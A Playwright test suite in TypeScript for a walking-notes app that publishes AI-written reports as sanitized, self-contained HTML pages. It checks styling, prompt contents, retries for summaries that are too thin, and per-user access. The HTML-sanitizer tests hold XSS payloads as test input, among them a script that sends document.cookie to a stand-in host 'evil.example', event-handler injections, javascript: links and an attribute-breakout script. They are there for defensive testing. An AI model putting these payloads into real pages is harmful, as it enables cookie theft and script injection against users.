import { readFileSync } from "node:fs";
import { expect, test } from "@playwright/test";
import { publishThreadArtifact } from "@/lib/artifacts/build";
import {
  ARTIFACT_RESPONSE_HEADERS,
  renderArtifactDocument,
} from "@/lib/artifacts/document";
import {
  ARTIFACT_MIN_REPORT_LENGTH,
  ARTIFACT_MIN_UNCLASSIFIED_LENGTH,
  earnsArtifact,
} from "@/lib/artifacts/eligibility";
import {
  ARTIFACT_BODY_CLASSES,
  ARTIFACT_STYLESHEET,
  QUADRANGLE_COLORS,
} from "@/lib/artifacts/design-system";
import {
  createMemoryArtifactRepository,
  resetMemoryArtifactRepository,
} from "@/lib/artifacts/memory-repository";
import { checkArtifactCompleteness } from "@/lib/artifacts/completeness";
import {
  ARTIFACT_MAX_OUTPUT_TOKENS,
  ARTIFACT_RETRY_INSTRUCTION,
  DEFAULT_ARTIFACT_PUBLISH_INSTRUCTION,
  buildPublishPrompt,
  parseArtifactGeneration,
} from "@/lib/artifacts/publish";
import { sanitizeArtifactHtml } from "@/lib/artifacts/sanitize";
import type { ThreadArtifact } from "@/lib/artifacts/types";
import { createFakeGatewayClient } from "@/lib/enrichment/gateway";
import {
  createMemoryEnrichmentRepository,
  resetMemoryEnrichmentRepository,
} from "@/lib/enrichment/memory-repository";
import { processPendingEnrichments } from "@/lib/enrichment/process";
import type { ThreadEnrichment } from "@/lib/enrichment/types";
import {
  createMemoryBlobStore,
  resetMemoryBlobStore,
} from "@/lib/media/memory-blob-store";
import {
  createMemoryThreadRepository,
  resetMemoryThreadRepository,
} from "@/lib/sync/memory-repository";

const NS = "artifact-tests";

test.beforeEach(() => {
  resetMemoryThreadRepository(NS);
  resetMemoryEnrichmentRepository(NS);
  resetMemoryArtifactRepository(NS);
  resetMemoryBlobStore(NS);
});

function longReport(marker: string, length: number): string {
  const sentence = `${marker} The stone came from a quarry two valleys over. `;
  const filled = sentence.repeat(Math.ceil(length / sentence.length));
  // Exactly `length` characters after trimming — the eligibility boundary
  // is measured on the trimmed report.
  return `${filled.slice(0, length - 1)}.`;
}

function enrichmentFixture(
  overrides: Partial<ThreadEnrichment> = {},
): ThreadEnrichment {
  return {
    id: "enrichment:job-1",
    threadId: "thread-1",
    text: "A report.",
    model: "anthropic/claude-sonnet-5",
    basisRevision: 1,
    basisEntryIds: ["cap-1"],
    targetCaptureIds: ["cap-1"],
    createdAt: "2026-07-24T10:00:00.000Z",
    title: "Where the patio stone came from",
    kind: "question",
    topics: ["bluestone"],
    ask: null,
    sources: [],
    ...overrides,
  };
}

function artifactFixture(
  overrides: Partial<ThreadArtifact> = {},
): ThreadArtifact {
  return {
    id: "artifact:enrichment:job-1",
    threadId: "thread-1",
    enrichmentId: "enrichment:job-1",
    title: "Where the patio stone came from",
    standfirst: "The yard two valleys over still cuts it.",
    kind: "question",
    body: '<p class="artifact-lede">Bluestone, quarried locally.</p>',
    sources: [
      {
        title: "Catskill Bluestone",
        url: "https://example.org/bluestone",
        retrievedAt: "2026-07-24T10:00:00.000Z",
      },
    ],
    model: "anthropic/claude-sonnet-5",
    createdAt: "2026-07-24T10:05:00.000Z",
    ...overrides,
  };
}

/* --- The design system is DESIGN.md's, not a second opinion ---------------- */

test("the Artifact stylesheet carries DESIGN.md's own token values", () => {
  const design = readFileSync("DESIGN.md", "utf8");
  const frontMatter = design.slice(0, design.indexOf("\n---", 4));

  for (const [token, value] of Object.entries(QUADRANGLE_COLORS)) {
    const declared = new RegExp(`^\\s+${token}:\\s*"([^"]+)"`, "m").exec(
      frontMatter,
    );
    expect(declared, `DESIGN.md declares colors.${token}`).not.toBeNull();
    expect(declared![1], `colors.${token} matches DESIGN.md`).toBe(value);
    expect(ARTIFACT_STYLESHEET).toContain(value);
  }
});

test("every class the publish instruction offers is a class the sheet styles", () => {
  for (const className of ARTIFACT_BODY_CLASSES) {
    expect(
      ARTIFACT_STYLESHEET,
      `${className} is styled by the Artifact sheet`,
    ).toContain(`.${className}`);
    expect(
      DEFAULT_ARTIFACT_PUBLISH_INSTRUCTION,
      `${className} is offered to the model`,
    ).toContain(className);
  }
});

test("the page is self-contained: no script, no third-party asset", () => {
  const document = renderArtifactDocument(artifactFixture());

  expect(document).not.toContain("<script");
  expect(document).not.toMatch(/https?:\/\/(?!example\.org)/);
  // Fonts are self-hosted, same-origin — DESIGN.md forbids a CDN.
  expect(document).toContain('url("/fonts/barlow-condensed-600.woff2")');
  expect(ARTIFACT_RESPONSE_HEADERS["content-security-policy"]).toContain(
    "default-src 'none'",
  );
  expect(ARTIFACT_RESPONSE_HEADERS["cache-control"]).toBe("private, no-store");
});

test("the sheet prints the masthead, the sources, and the footer around the body", () => {
  const document = renderArtifactDocument(artifactFixture());

  expect(document).toContain("Walking Thoughts · Provisional Survey");
  expect(document).toContain("Where the patio stone came from");
  expect(document).toContain("The yard two valleys over still cuts it.");
  expect(document).toContain('<p class="artifact-lede">Bluestone, quarried locally.</p>');
  expect(document).toContain('href="https://example.org/bluestone"');
  expect(document).toContain("Catskill Bluestone");
  expect(document).toContain("anthropic/claude-sonnet-5");
});

test("a Thread title with markup cannot break out of the masthead", () => {
  const document = renderArtifactDocument(
    artifactFixture({ title: "<script>alert(1)</script> Stone" }),
  );

  expect(document).not.toContain("<script>alert(1)</script>");
  expect(document).toContain("&lt;script&gt;alert(1)&lt;/script&gt; Stone");
});

/* --- Model HTML is re-emitted from an allowlist, never passed through ------ */

test("script, style, and event handlers do not survive sanitizing", () => {
  const dirty = [
    '<p class="artifact-lede" onclick="steal()">Hello</p>',
    "<script>fetch('https://evil.example/'+document.cookie)</script>",
    "<style>body{display:none}</style>",
    '<img src="x" onerror="alert(1)" />',
    "<iframe src=\"https://evil.example\"></iframe>",
    '<a href="javascript:alert(1)">tap</a>',
    '<a href="&#106;avascript:alert(1)">tap</a>',
    '<div style="position:fixed">fixed</div>',
  ].join("\n");

  const clean = sanitizeArtifactHtml(dirty);

  expect(clean).not.toContain("onclick");
  expect(clean).not.toContain("onerror");
  expect(clean).not.toContain("<script");
  expect(clean).not.toContain("<style");
  expect(clean).not.toContain("<iframe");
  expect(clean).not.toContain("<img");
  expect(clean).not.toContain("javascript:");
  expect(clean).not.toContain("style=");
  expect(clean).not.toContain("fetch(");
  expect(clean).not.toContain("display:none");
  // The prose around the payloads survives.
  expect(clean).toContain('<p class="artifact-lede">Hello</p>');
  expect(clean).toContain("tap");
  expect(clean).toContain("fixed");
});

test("a `>` inside an attribute value cannot end the tag early", () => {
  const clean = sanitizeArtifactHtml(
    '<p class="a>b"><span title="x><script>alert(1)</script>">text</span></p>',
  );

  expect(clean).not.toContain("<script");
  expect(clean).not.toContain("alert(1)");
  expect(clean).toContain("text");
});

test("real links keep their href and leave with no referrer", () => {
  const clean = sanitizeArtifactHtml(
    '<p>See <a href="https://example.org/bluestone">the quarry</a>.</p>',
  );

  expect(clean).toContain('href="https://example.org/bluestone"');
  expect(clean).toContain('rel="noreferrer noopener"');
});

test("unknown tags are unwrapped so the words survive the markup", () => {
  expect(sanitizeArtifactHtml("<marquee><p>Still here</p></marquee>")).toBe(
    "<p>Still here</p>",
  );
});

test("tags the model left open are closed on the way out", () => {
  expect(sanitizeArtifactHtml("<section><p>Unclosed")).toBe(
    "<section><p>Unclosed</p></section>",
  );
});

/* --- Parsing what the model returns --------------------------------------- */

test("the standfirst comes off the top and the fence comes off the body", () => {
  const parsed = parseArtifactGeneration(
    [
      "STANDFIRST: The yard two valleys over still cuts it.",
      "",
      "```html",
      '<p class="artifact-lede">Bluestone, quarried locally.</p>',
      "```",
    ].join("\n"),
  );

  expect(parsed.standfirst).toBe("The yard two valleys over still cuts it.");
  expect(parsed.body).toBe(
    '<p class="artifact-lede">Bluestone, quarried locally.</p>',
  );
});

test("a model that answers in prose still publishes a readable page", () => {
  const parsed = parseArtifactGeneration(
    "The stone is bluestone.\n\nThe yard is still open Saturdays.",
  );

  expect(parsed.standfirst).toBeNull();
  expect(parsed.body).toBe(
    '<p class="artifact-lede">The stone is bluestone.</p>\n' +
      "<p>The yard is still open Saturdays.</p>",
  );
});

test("the publish prompt hands over the report, the walker's words, and only real sources", () => {
  const prompt = buildPublishPrompt({
    threadTitle: "Where the patio stone came from",
    kind: "question",
    report: "**Bluestone.** Quarried two valleys over.",
    captureWords: ["where did we get the stones for the patio?"],
    sources: [
      {
        title: "Catskill Bluestone",
        url: "https://example.org/bluestone",
        retrievedAt: "2026-07-24T10:00:00.000Z",
      },
    ],
    walkedAt: "2026-07-24T09:40:00.000Z",
  });

  expect(prompt).toContain("**Bluestone.** Quarried two valleys over.");
  expect(prompt).toContain("where did we get the stones for the patio?");
  expect(prompt).toContain("[1] Catskill Bluestone — https://example.org/bluestone");
  expect(prompt).toContain("2026-07-24T09:40:00.000Z");
});

test("with no sources the model is told plainly not to invent one", () => {
  const prompt = buildPublishPrompt({
    threadTitle: "Trail notes",
    kind: "idea",
    report: "An idea worth sharpening.",
    captureWords: [],
    sources: [],
  });

  expect(prompt).toContain("do not add any links");
  expect(prompt).toContain("(media only)");
});

/* --- Only reports earn a page --------------------------------------------- */

test("a question or an idea of report length earns a page", () => {
  expect(
    earnsArtifact({ kind: "question", text: longReport("Q", ARTIFACT_MIN_REPORT_LENGTH) }),
  ).toBe(true);
  expect(
    earnsArtifact({ kind: "idea", text: longReport("I", ARTIFACT_MIN_REPORT_LENGTH) }),
  ).toBe(true);
});

test("the kinds that were never reports do not get one", () => {
  const long = longReport("T", 4_000);
  expect(earnsArtifact({ kind: "task", text: long })).toBe(false);
  expect(earnsArtifact({ kind: "observation", text: long })).toBe(false);
  expect(earnsArtifact({ kind: "place", text: long })).toBe(false);
  expect(earnsArtifact({ kind: "media", text: long })).toBe(false);
  expect(earnsArtifact({ kind: "noise", text: long })).toBe(false);
});

test("a short answer stays a Thread entry, and a long unclassified one is a report", () => {
  expect(earnsArtifact({ kind: "question", text: "Yes — bluestone." })).toBe(false);
  expect(earnsArtifact({ kind: null, text: longReport("U", 900) })).toBe(false);
  expect(
    earnsArtifact({
      kind: null,
      text: longReport("U", ARTIFACT_MIN_UNCLASSIFIED_LENGTH),
    }),
  ).toBe(true);
});

/* --- Publishing ------------------------------------------------------------ */

/* --- The page carries the report, or it is not published ------------------ */

test("a page thinner than its report fails the completeness check", () => {
  const report = longReport("Q", 2_000);

  // A tidy summary of a 2,000-character report is the failure that shipped.
  const summary = checkArtifactCompleteness({
    body: `<p class="artifact-lede">${longReport("S", 600)}</p>`,
    report,
  });
  expect(summary.ok).toBe(false);
  expect(summary.ratio).toBeLessThan(0.5);

  // Markup is not substance: tags and classes do not count toward length.
  const padded = checkArtifactCompleteness({
    body: `<section class="artifact-section"><h2>Heading</h2>${"<p></p>".repeat(200)}</section>`,
    report,
  });
  expect(padded.ok).toBe(false);

  // A page that carries the report, with headings and a facts list on top,
  // lands above it — and is never rejected for being thorough.
  const full = checkArtifactCompleteness({
    body: `<p class="artifact-lede">${report}</p><dl class="artifact-key"><dt>Formation</dt><dd>Devonian</dd></dl>`,
    report,
  });
  expect(full.ok).toBe(true);
  expect(full.ratio).toBeGreaterThan(1);
});

test("a thin first pass is asked again, with the failure named", async () => {
  const repository = createMemoryArtifactRepository(NS);
  const report = longReport("Q", 2_000);
  const systems: string[] = [];

  const gateway = createFakeGatewayClient(async (input) => {
    systems.push(input.system);
    return systems.length === 1
      ? { text: `<p class="artifact-lede">${longReport("S", 400)}</p>` }
      : { text: `<p class="artifact-lede">${report}</p>` };
  });

  const result = await publishThreadArtifact({
    userId: "user_a",
    threadTitle: "Where the patio stone came from",
    enrichment: enrichmentFixture({ text: report }),
    captureWords: ["where did we get the stones for the patio?"],
    repository,
    gateway,
  });

  expect(systems).toHaveLength(2);
  expect(systems[0]).not.toContain(ARTIFACT_RETRY_INSTRUCTION);
  expect(systems[1]).toContain(ARTIFACT_RETRY_INSTRUCTION);
  expect(result.outcome).toBe("retried");
  expect(result.completeness.ok).toBe(true);
  expect(result.artifact.body).toContain("The stone came from a quarry");
});

test("when both passes lose the report, the page becomes the report", async () => {
  const repository = createMemoryArtifactRepository(NS);
  const report = [
    "**Bluestone.** Quarried two valleys over, in the Kaaterskill drainage.",
    "",
    "## What the stone is",
    "",
    "- Feldspathic greywacke sandstone",
    "- Splits along bedding planes",
    "",
    "See [the survey](https://example.org/bluestone) for the map of pits.",
    "",
    longReport("Q", 1_200),
  ].join("\n");

  const result = await publishThreadArtifact({
    userId: "user_a",
    threadTitle: "Where the patio stone came from",
    enrichment: enrichmentFixture({ text: report }),
    captureWords: [],
    repository,
    // A press that will not stop summarizing.
    gateway: createFakeGatewayClient(async () => ({
      text: '<p class="artifact-lede">Bluestone, quarried locally.</p>',
    })),
  });

  expect(result.outcome).toBe("report_fallback");
  // The report itself, laid out on the sheet — headings, lists, links, bold.
  expect(result.artifact.body).toContain("<h2>What the stone is</h2>");
  expect(result.artifact.body).toContain(
    "<li>Feldspathic greywacke sandstone</li>",
  );
  expect(result.artifact.body).toContain(
    '<a href="https://example.org/bluestone"',
  );
  expect(result.artifact.body).toContain("<strong>Bluestone.</strong>");
  expect(result.completeness.ok).toBe(true);
});

test("the press is given the whole Thread, not just the newest report", () => {
  const prompt = buildPublishPrompt({
    threadTitle: "Which camera for the trail",
    kind: "question",
    report: "The RX100 is the one.",
    captureWords: ["what camera should I carry?"],
    sources: [],
    priorReports: ["An earlier pass compared three bodies."],
    research: [
      {
        action: "search",
        provider: "brave",
        query: "compact camera hiking 2026",
        resultCount: 8,
        at: "2026-07-24T10:00:00.000Z",
      },
      {
        action: "read",
        provider: "brave",
        url: "https://example.org/rx100",
        title: "RX100 field review",
        at: "2026-07-24T10:01:00.000Z",
      },
    ],
    ask: "How much weight are you willing to carry?",
  });

  expect(prompt).toContain("An earlier pass compared three bodies.");
  expect(prompt).toContain('searched "compact camera hiking 2026" (8 results)');
  expect(prompt).toContain("read RX100 field review — https://example.org/rx100");
  expect(prompt).toContain("How much weight are you willing to carry?");
});

test("the brief leads with carrying the report, not with markup", () => {
  const instruction = DEFAULT_ARTIFACT_PUBLISH_INSTRUCTION;
  const completeness = instruction.indexOf("fullest form");
  const markup = instruction.indexOf("Return HTML only");

  // The first version buried fidelity under the tag list and published
  // summaries. Content comes first now.
  expect(completeness).toBeGreaterThan(-1);
  expect(completeness).toBeLessThan(markup);
  expect(instruction).toContain("never a summary");
  expect(instruction).toContain("longer than the report, not shorter");
});

test("the publish pass asks for room a report laid out as a page needs", async () => {
  let budget: number | undefined;
  await publishThreadArtifact({
    userId: "user_a",
    threadTitle: "Trail notes",
    enrichment: enrichmentFixture({ text: longReport("Q", 900) }),
    captureWords: [],
    repository: createMemoryArtifactRepository(NS),
    gateway: createFakeGatewayClient(async (input) => {
      budget = input.maxOutputTokens;
      return { text: `<p>${longReport("Q", 900)}</p>` };
    }),
  });

  expect(budget).toBe(ARTIFACT_MAX_OUTPUT_TOKENS);
  // Well clear of the SDK's 4,096 Anthropic default, which truncated pages.
  expect(ARTIFACT_MAX_OUTPUT_TOKENS).toBeGreaterThan(8_000);
});

test("republishing writes over the page already stored", async () => {
  const repository = createMemoryArtifactRepository(NS);
  const report = longReport("Q", 900);
  const enrichment = enrichmentFixture({ text: report });
  let pass = 0;

  const publish = (republish: boolean) =>
    publishThreadArtifact({
      userId: "user_a",
      threadTitle: "Where the patio stone came from",
      enrichment,
      captureWords: [],
      repository,
      republish,
      gateway: createFakeGatewayClient(async () => {
        pass += 1;
        return { text: `<p class="artifact-lede">Pass ${pass}. ${report}</p>` };
      }),
    });

  const first = await publish(false);
  expect(first.artifact.body).toContain("Pass 1.");

  // Without republish, the stored page stands and the gateway is not called.
  const again = await publish(false);
  expect(again.created).toBe(false);
  expect(again.artifact.body).toContain("Pass 1.");
  expect(pass).toBe(1);

  const rebuilt = await publish(true);
  expect(rebuilt.artifact.body).toContain("Pass 2.");
  expect(await repository.listThreadArtifacts("user_a", "thread-1")).toHaveLength(
    1,
  );
});

test("publishing twice returns the page already stored", async () => {
  const repository = createMemoryArtifactRepository(NS);
  const enrichment: ThreadEnrichment = {
    id: "enrichment:job-1",
    threadId: "thread-1",
    text: longReport("Q", 900),
    model: "anthropic/claude-sonnet-5",
    basisRevision: 1,
    basisEntryIds: ["cap-1"],
    targetCaptureIds: ["cap-1"],
    createdAt: "2026-07-24T10:00:00.000Z",
    title: "Where the patio stone came from",
    kind: "question",
    topics: ["bluestone"],
    ask: null,
    sources: [],
  };

  let calls = 0;
  const gateway = createFakeGatewayClient(async () => {
    calls += 1;
    // A page that carries its report, so nothing here trips the retry.
    return {
      text: `STANDFIRST: Bluestone.\n\n<p class="artifact-lede">${enrichment.text}</p>`,
    };
  });
  const input = {
    userId: "user_a",
    threadTitle: "Where the patio stone came from",
    enrichment,
    captureWords: ["where did we get the stones for the patio?"],
    repository,
    gateway,
  };

  const first = await publishThreadArtifact(input);
  const second = await publishThreadArtifact(input);

  expect(first.created).toBe(true);
  expect(second.created).toBe(false);
  expect(second.artifact.id).toBe(first.artifact.id);
  expect(calls).toBe(1);
});

test("Enrichment publishes the report as a page in the same pass", async () => {
  const threads = createMemoryThreadRepository(NS);
  const enrichments = createMemoryEnrichmentRepository(NS, threads);
  const artifacts = createMemoryArtifactRepository(NS);

  await threads.upsertCaptures("user_a", [
    {
      id: "cap-1",
      text: "where did we get the stones for the patio?",
      createdAt: "2026-07-24T09:40:00.000Z",
      location: null,
      threadId: null,
      sequence: 1,
      idempotencyKey: "cap-1",
      attachments: [],
    },
  ]);

  let publishPrompt = "";
  const result = await processPendingEnrichments("user_a", enrichments, {
    gateway: createFakeGatewayClient(async () => ({
      text: longReport("Q", 900),
      title: "Where the patio stone came from",
      kind: "question" as const,
      topics: ["bluestone"],
    })),
    artifactGateway: createFakeGatewayClient(async (input) => {
      publishPrompt = input.prompt;
      return {
        text: [
          "STANDFIRST: The yard two valleys over still cuts it.",
          "",
          '<p class="artifact-lede">Bluestone, quarried locally.</p>',
          // The page carries the report it publishes, so it stands as
          // written rather than falling back to the report itself.
          `<section class="artifact-section"><h2>What the stone is</h2><p>${longReport(
            "Q",
            900,
          )}</p></section>`,
        ].join("\n"),
      };
    }),
    artifactRepository: artifacts,
    blobStore: createMemoryBlobStore(NS),
    threadRepository: threads,
    pushSender: null,
  });

  const threadId = result.results[0]!.threadId;
  const published = await artifacts.listThreadArtifacts("user_a", threadId);

  expect(published).toHaveLength(1);
  expect(published[0]!.title).toBe("Where the patio stone came from");
  expect(published[0]!.standfirst).toBe(
    "The yard two valleys over still cuts it.",
  );
  expect(published[0]!.kind).toBe("question");
  // The page is laid out from the report, with the walker's own words to quote.
  expect(publishPrompt).toContain("where did we get the stones for the patio?");

  const stored = await artifacts.getArtifact("user_a", published[0]!.id);
  expect(renderArtifactDocument(stored!)).toContain(
    "Bluestone, quarried locally.",
  );
});

test("a Capture that was never a report gets no page", async () => {
  const threads = createMemoryThreadRepository(NS);
  const enrichments = createMemoryEnrichmentRepository(NS, threads);
  const artifacts = createMemoryArtifactRepository(NS);

  await threads.upsertCaptures("user_b", [
    {
      id: "cap-task",
      text: "call the stone yard",
      createdAt: "2026-07-24T09:41:00.000Z",
      location: null,
      threadId: null,
      sequence: 1,
      idempotencyKey: "cap-task",
      attachments: [],
    },
  ]);

  let published = false;
  const result = await processPendingEnrichments("user_b", enrichments, {
    gateway: createFakeGatewayClient(async () => ({
      text: "Call the yard on Route 28; they open at 07:00.",
      title: "Call the stone yard",
      kind: "task" as const,
    })),
    artifactGateway: createFakeGatewayClient(async () => {
      published = true;
      return { text: "<p>never asked for</p>" };
    }),
    artifactRepository: artifacts,
    blobStore: createMemoryBlobStore(NS),
    threadRepository: threads,
    pushSender: null,
  });

  const threadId = result.results[0]!.threadId;
  expect(published).toBe(false);
  expect(await artifacts.listThreadArtifacts("user_b", threadId)).toEqual([]);
});

test("a publish failure leaves the Enrichment complete", async () => {
  const threads = createMemoryThreadRepository(NS);
  const enrichments = createMemoryEnrichmentRepository(NS, threads);
  const artifacts = createMemoryArtifactRepository(NS);

  await threads.upsertCaptures("user_c", [
    {
      id: "cap-question",
      text: "what is growing on the north side of the beech?",
      createdAt: "2026-07-24T09:42:00.000Z",
      location: null,
      threadId: null,
      sequence: 1,
      idempotencyKey: "cap-question",
      attachments: [],
    },
  ]);

  const result = await processPendingEnrichments("user_c", enrichments, {
    gateway: createFakeGatewayClient(async () => ({
      text: longReport("Q", 900),
      title: "Beech bark disease",
      kind: "question" as const,
    })),
    artifactGateway: createFakeGatewayClient(async () => {
      throw new Error("gateway_unavailable");
    }),
    artifactRepository: artifacts,
    blobStore: createMemoryBlobStore(NS),
    threadRepository: threads,
    pushSender: null,
  });

  expect(result.results[0]?.status).toBe("complete");
  const threadId = result.results[0]!.threadId;
  const stored = await enrichments.listThreadEnrichments("user_c", threadId);
  expect(stored).toHaveLength(1);
  expect(await artifacts.listThreadArtifacts("user_c", threadId)).toEqual([]);
});

/* --- The page is a private desk surface, not a share link ----------------- */

test("Artifact surfaces are behind the same fail-closed boundary", async ({
  request,
}) => {
  for (const path of [
    "/api/artifacts",
    "/api/artifacts/publish",
    "/artifacts/artifact:enrichment:job-1",
  ]) {
    const response =
      path === "/api/artifacts/publish"
        ? await request.post(path, { data: { threadId: "thread-1" } })
        : await request.get(path);
    // No Clerk identity: configuration_required, signed out, or forbidden —
    // never a page, and never a 500.
    expect([401, 403, 404, 503], `${path} is closed to an anonymous request`)
      .toContain(response.status());
    expect(response.headers()["content-type"] ?? "").not.toContain("text/html");
  }
});

test("one walker's page is not another walker's to read", async () => {
  const repository = createMemoryArtifactRepository(NS);
  const artifact = artifactFixture();
  await repository.saveArtifact("user_a", artifact);

  expect(await repository.getArtifact("user_a", artifact.id)).not.toBeNull();
  expect(await repository.getArtifact("user_b", artifact.id)).toBeNull();
  expect(await repository.listArtifacts("user_b")).toEqual([]);
});
